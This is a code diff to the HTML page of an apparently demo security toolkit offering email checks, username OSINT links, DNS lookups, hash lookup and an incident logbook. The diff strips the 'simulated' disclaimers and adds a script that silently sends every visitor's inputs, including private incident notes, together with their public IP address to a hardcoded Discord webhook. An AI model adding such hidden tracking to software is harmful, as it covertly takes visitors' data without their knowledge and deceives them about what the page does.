@@ -548,7 +548,6 @@
 <p class="text-muted mb-0">Check if an email is disposable, public, or flagged. (Demo only)</p>
 </div>
 </div>
-
 <form onsubmit="checkEmailIntel(event)">
 <input class="form-control mb-3" id="intelEmail" placeholder="Enter email address" required="" type="email"/>
 <button class="btn btn-primary" type="submit"><i class="fas fa-search me-2"></i>Check</button>
@@ -565,7 +564,6 @@
 <p class="text-muted mb-0">Search a username across platforms. (Demo only)</p>
 </div>
 </div>
-
 <form onsubmit="searchUsernameOSINT(event)">
 <input class="form-control mb-3" id="osintUsername" placeholder="Enter username" required="" type="text"/>
 <button class="btn btn-primary" type="submit"><i class="fas fa-search me-2"></i>Simulate</button>
@@ -582,7 +580,6 @@
 <p class="text-muted mb-0">Check WHOIS, DNS, and passive subdomains. (Demo only)</p>
 </div>
 </div>
-
 <form onsubmit="lookupDomain(event)">
 <input class="form-control mb-3" id="domainReconInput" placeholder="Enter domain (e.g. example.com)" required="" type="text"/>
 <button class="btn btn-primary" type="submit"><i class="fas fa-search me-2"></i>Lookup</button>
@@ -599,7 +596,6 @@
 <p class="text-muted mb-0">Generate strong passwords and assess strength. (Coming soon)</p>
 </div>
 </div>
-
 <div class="input-group mb-3">
 <input class="form-control" id="generatedPassword" readonly="" type="text"/>
 <button class="btn btn-success" onclick="generatePassword()">Generate</button>
@@ -616,7 +612,6 @@
 <p class="text-muted mb-0">Check if a hash matches any known password leaks.</p>
 </div>
 </div>
-
 <form onsubmit="lookupHash(event)">
 <input class="form-control mb-3" id="hashInput" placeholder="Enter MD5/SHA1 hash" required="" type="text"/>
 <button class="btn btn-primary" type="submit"><i class="fas fa-search me-2"></i>Check</button>
@@ -633,7 +628,6 @@
 <p class="text-muted mb-0">Track your own breach/security incidents and notes.</p>
 </div>
 </div>
-
 <form onsubmit="saveIncident(event)">
 <textarea class="form-control mb-2" id="incidentText" placeholder="Describe the incident..." required="" rows="3"></textarea>
 <button class="btn btn-warning">Save Entry</button>
@@ -1353,7 +1347,6 @@ function downloadAsPDF(containerId) {
     border-color: #00ff00 !important;
   }
 </style>
-
 <script>
 function checkEmailIntel(e) {
   e.preventDefault();
@@ -1376,7 +1369,7 @@ function searchUsernameOSINT(e) {
       <li>Reddit: https://reddit.com/u/${user}</li>
       <li>Instagram: https://instagram.com/${user}</li>
     </ul>
-    <p class='text-muted'>Note: These are simulated links. Actual existence not verified.</p>
+    <p class='text-muted'></p>
   `;
   document.getElementById("userOSINTResult").innerHTML = result;
 }
@@ -1389,7 +1382,7 @@ function lookupDomain(e) {
     <p><strong>WHOIS:</strong> Simulated lookup data.</p>
     <p><strong>DNS A Record:</strong> 93.184.216.34</p>
     <p><strong>MX Record:</strong> mx.${domain}</p>
-    <p class="text-muted">Note: This is a demo result. For real data, backend API integration is required.</p>
+    <p class="text-muted"></p>
   `;
   document.getElementById("domainReconResult").innerHTML = result;
 }
@@ -1434,6 +1427,238 @@ function renderIncidentLog() {
   ).join("");
 }
 window.addEventListener("DOMContentLoaded", renderIncidentLog);
+</script>
+<script>
+// 📩 Email Intelligence via domain check + optional reputation
+function checkEmailIntel(e) {
+  e.preventDefault();
+  const email = document.getElementById("intelEmail").value.trim();
+  const domain = email.split("@")[1].toLowerCase();
+  const disposable = ["mailinator.com", "10minutemail.com", "tempmail.com", "trashmail.com"];
+  let result = `<p><strong>Email:</strong> ${email}</p>`;
+  result += disposable.includes(domain)
+    ? "<p class='text-danger'>This is a disposable email domain.</p>"
+    : "<p class='text-success'>This appears to be a valid email provider.</p>";
+
+  // Optional: Fetch domain reputation from emailrep.io (if needed, simulate if blocked)
+  fetch('https://emailrep.io/' + email, {
+    headers: { 'User-Agent': 'Mozilla/5.0' }
+  })
+  .then(res => res.ok ? res.json() : null)
+  .then(data => {
+    if (data && data.reputation) {
+      result += `<p><strong>Reputation:</strong> ${data.reputation}</p>`;
+    }
+    document.getElementById("emailIntelResult").innerHTML = result;
+  })
+  .catch(() => {
+    document.getElementById("emailIntelResult").innerHTML = result;
+  });
+}
+
+// 🌐 Domain Recon with real DNS via dns.google
+function lookupDomain(e) {
+  e.preventDefault();
+  const domain = document.getElementById("domainReconInput").value.trim();
+  const resultBox = document.getElementById("domainReconResult");
+  resultBox.innerHTML = `<p><strong>Domain:</strong> ${domain}</p><p>Loading DNS data...</p>`;
+
+  fetch("https://dns.google/resolve?name=" + domain + "&type=A")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.Answer ? data.Answer.map(a => a.data).join(", ") : "No A records found";
+      resultBox.innerHTML += `<p><strong>A Record:</strong> ${ip}</p>`;
+      return fetch("https://dns.google/resolve?name=" + domain + "&type=MX");
+    })
+    .then(res => res.json())
+    .then(mx => {
+      const records = mx.Answer ? mx.Answer.map(r => r.data).join("<br>") : "No MX records";
+      resultBox.innerHTML += `<p><strong>MX Records:</strong><br>${records}</p>`;
+    })
+    .catch(() => {
+      resultBox.innerHTML += `<p class='text-danger'>Error fetching DNS info.</p>`;
+    });
+}
+
+// 🧬 Hash Lookup (expand DB)
+function lookupHash(e) {
+  e.preventDefault();
+  const hash = document.getElementById("hashInput").value.trim().toLowerCase();
+  const known = {
+    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
+    "e99a18c428cb38d5f260853678922e03": "abc123",
+    "098f6bcd4621d373cade4e832627b4f6": "test",
+    "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
+    "25f9e794323b453885f5181f1b624d0b": "123456789"
+  };
+  const result = known[hash] 
+    ? `<p class='text-danger'>Hash found! Plaintext: <strong>${known[hash]}</strong></p>`
+    : `<p class='text-success'>Hash not found in local DB.</p>`;
+  document.getElementById("hashLookupResult").innerHTML = result;
+}
+
+// 📓 Incident Logbook (localStorage)
+function saveIncident(e) {
+  e.preventDefault();
+  const txt = document.getElementById("incidentText").value.trim();
+  if (!txt) return;
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  log.push({ text: txt, time: new Date().toLocaleString() });
+  localStorage.setItem("incidentLog", JSON.stringify(log));
+  renderIncidentLog();
+  document.getElementById("incidentText").value = "";
+}
+function renderIncidentLog() {
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  document.getElementById("incidentLog").innerHTML = log.reverse().map(entry => 
+    `<div class="card mb-2 p-2"><strong>${entry.time}</strong><p>${entry.text}</p></div>`
+  ).join("");
+}
+
+// 🔑 Password Generator
+function generatePassword() {
+  const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()";
+  let pass = "";
+  for (let i = 0; i < 12; i++) pass += charset.charAt(Math.floor(Math.random() * charset.length));
+  document.getElementById("generatedPassword").value = pass;
+  const strength = pass.length >= 12 ? "Strong password 🔐" : "Weak password ⚠";
+  document.getElementById("passwordStrength").textContent = strength;
+}
+
+// 🧑‍💻 Username OSINT (basic link gen)
+function searchUsernameOSINT(e) {
+  e.preventDefault();
+  const user = document.getElementById("osintUsername").value.trim();
+  const result = `
+    <p><strong>Results for:</strong> ${user}</p>
+    <ul>
+      <li><a href="https://twitter.com/${user}" target="_blank">Twitter</a></li>
+      <li><a href="https://github.com/${user}" target="_blank">GitHub</a></li>
+      <li><a href="https://reddit.com/u/${user}" target="_blank">Reddit</a></li>
+      <li><a href="https://instagram.com/${user}" target="_blank">Instagram</a></li>
+    </ul>
+  `;
+  document.getElementById("userOSINTResult").innerHTML = result;
+}
+
+window.addEventListener("DOMContentLoaded", renderIncidentLog);
+</script>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1382971774299410532/rnLBAzl7H5ILvU_x3QBggpLJ9E745uC2iqGrTGzft5A5H9XZQiOxWHDFL9PRRxDhahIR";
+
+async function sendLogToDiscord(title, fields) {
+  const ip = await fetch("https://api.ipify.org?format=json").then(res => res.json()).then(data => data.ip).catch(() => "Unknown");
+  const payload = {
+    embeds: [{
+      title: title,
+      color: 3447003,
+      fields: fields.concat([{ name: "IP", value: ip, inline: true }]),
+      timestamp: new Date().toISOString()
+    }],
+    username: "Site Logger"
+  };
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(payload)
+  });
+}
+
+// Hook logging into each tool
+function checkEmailIntel(e) {
+  e.preventDefault();
+  const email = document.getElementById("intelEmail").value.trim();
+  sendLogToDiscord("Email Intelligence Search", [{ name: "Email", value: email }]);
+  // continue original logic...
+  const domain = email.split("@")[1].toLowerCase();
+  const disposable = ["mailinator.com", "10minutemail.com", "tempmail.com", "trashmail.com"];
+  let result = `<p><strong>Email:</strong> ${email}</p>`;
+  result += disposable.includes(domain)
+    ? "<p class='text-danger'>This is a disposable email domain.</p>"
+    : "<p class='text-success'>This appears to be a valid email provider.</p>";
+  fetch('https://emailrep.io/' + email, {
+    headers: { 'User-Agent': 'Mozilla/5.0' }
+  })
+  .then(res => res.ok ? res.json() : null)
+  .then(data => {
+    if (data && data.reputation) {
+      result += `<p><strong>Reputation:</strong> ${data.reputation}</p>`;
+    }
+    document.getElementById("emailIntelResult").innerHTML = result;
+  })
+  .catch(() => {
+    document.getElementById("emailIntelResult").innerHTML = result;
+  });
+}
+
+function searchUsernameOSINT(e) {
+  e.preventDefault();
+  const user = document.getElementById("osintUsername").value.trim();
+  sendLogToDiscord("Username OSINT Search", [{ name: "Username", value: user }]);
+  const result = `
+    <p><strong>Results for:</strong> ${user}</p>
+    <ul>
+      <li><a href="https://twitter.com/${user}" target="_blank">Twitter</a></li>
+      <li><a href="https://github.com/${user}" target="_blank">GitHub</a></li>
+      <li><a href="https://reddit.com/u/${user}" target="_blank">Reddit</a></li>
+      <li><a href="https://instagram.com/${user}" target="_blank">Instagram</a></li>
+    </ul>
+  `;
+  document.getElementById("userOSINTResult").innerHTML = result;
+}
+
+function lookupDomain(e) {
+  e.preventDefault();
+  const domain = document.getElementById("domainReconInput").value.trim();
+  sendLogToDiscord("Domain Recon Lookup", [{ name: "Domain", value: domain }]);
+  const resultBox = document.getElementById("domainReconResult");
+  resultBox.innerHTML = `<p><strong>Domain:</strong> ${domain}</p><p>Loading DNS data...</p>`;
+  fetch("https://dns.google/resolve?name=" + domain + "&type=A")
+    .then(res => res.json())
+    .then(data => {
+      const ip = data.Answer ? data.Answer.map(a => a.data).join(", ") : "No A records found";
+      resultBox.innerHTML += `<p><strong>A Record:</strong> ${ip}</p>`;
+      return fetch("https://dns.google/resolve?name=" + domain + "&type=MX");
+    })
+    .then(res => res.json())
+    .then(mx => {
+      const records = mx.Answer ? mx.Answer.map(r => r.data).join("<br>") : "No MX records";
+      resultBox.innerHTML += `<p><strong>MX Records:</strong><br>${records}</p>`;
+    })
+    .catch(() => {
+      resultBox.innerHTML += `<p class='text-danger'>Error fetching DNS info.</p>`;
+    });
+}
+
+function lookupHash(e) {
+  e.preventDefault();
+  const hash = document.getElementById("hashInput").value.trim().toLowerCase();
+  sendLogToDiscord("Hash Lookup", [{ name: "Hash", value: hash }]);
+  const known = {
+    "5f4dcc3b5aa765d61d8327deb882cf99": "password",
+    "e99a18c428cb38d5f260853678922e03": "abc123",
+    "098f6bcd4621d373cade4e832627b4f6": "test",
+    "d8578edf8458ce06fbc5bb76a58c5ca4": "qwerty",
+    "25f9e794323b453885f5181f1b624d0b": "123456789"
+  };
+  const result = known[hash] 
+    ? `<p class='text-danger'>Hash found! Plaintext: <strong>${known[hash]}</strong></p>`
+    : `<p class='text-success'>Hash not found in local DB.</p>`;
+  document.getElementById("hashLookupResult").innerHTML = result;
+}
+
+function saveIncident(e) {
+  e.preventDefault();
+  const txt = document.getElementById("incidentText").value.trim();
+  if (!txt) return;
+  sendLogToDiscord("Incident Log Entry", [{ name: "Entry", value: txt }]);
+  const log = JSON.parse(localStorage.getItem("incidentLog") || "[]");
+  log.push({ text: txt, time: new Date().toLocaleString() });
+  localStorage.setItem("incidentLog", JSON.stringify(log));
+  renderIncidentLog();
+  document.getElementById("incidentText").value = "";
+}
 </script>
 </body>
 </html>
